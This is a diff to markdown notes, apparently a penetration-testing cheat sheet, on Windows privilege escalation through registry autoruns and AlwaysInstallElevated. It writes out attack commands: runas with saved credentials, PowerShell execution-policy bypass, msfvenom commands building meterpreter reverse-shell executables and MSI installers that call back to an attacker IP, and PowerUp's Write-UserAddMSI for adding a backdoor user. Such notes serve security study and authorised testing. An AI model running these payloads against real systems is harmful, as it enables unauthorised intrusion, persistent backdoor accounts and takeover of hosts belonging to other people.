@@ -197,9 +197,11 @@ cmdkey /list
 C:\Windows\System32\runas.exe /user:[domain\user] /savecred "C:\Windows\System32\cmd.exe /c [command to run]"
 ```
 ## Registry
-### Enumeration
-#### Executionw with SysInternals
-##### [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
+
+### Escalation via Autorun
+#### Enumeration
+##### Enumeration with SysInternals
+###### [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
 > This actually opens a window, so is not command line only. Command line is autorunsc.exe
 * List all of the autorun executables in the registry
 ```cmd
@@ -209,7 +211,7 @@ autoruns64.exe
 ```cmd
 accesschk64 -wvu "[Path to executable(.exe)"
 ```
-##### Exeucution with PowerUP
+###### Enumeration with PowerUP
 ```powershell
 powershell -ep bypass
 
@@ -219,7 +221,7 @@ powershell -ep bypass
 # Execute All Checks (Similar to WinPEAS)
 Invoke-AllCheck
 ```
-### Exploitation
+#### Exploitation
 * Generate a revshell executable
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=[attackerIP] lport=[attacker port] -f exe -o [filename].exe
@@ -233,6 +235,27 @@ exploit
 ```
 * Log out and log in or login as administrative user
 
+### Escalation via AlwaysInstallElevated
+#### Enuemeration
+* Check if AlwaysInstallElevated is set to 1 in both of the below keys
+```cmd
+reg query HKLM\Softrware\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+```
+* PowerUP & WinPEAS will show these results
+
+#### Exploitation
+##### MSFVenom
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=[attacker ip] lport=[attacker port] -f msi -o [filename].msi
+# Setup Listener, transfer to host, execute
+```
+##### PowerUp
+> PowerUp creates an MSI that let's you add a backdoor user and add them to any group
+```cmd
+# Import as above
+Write-UserAddMSI
+```
 
 ## Executables
 
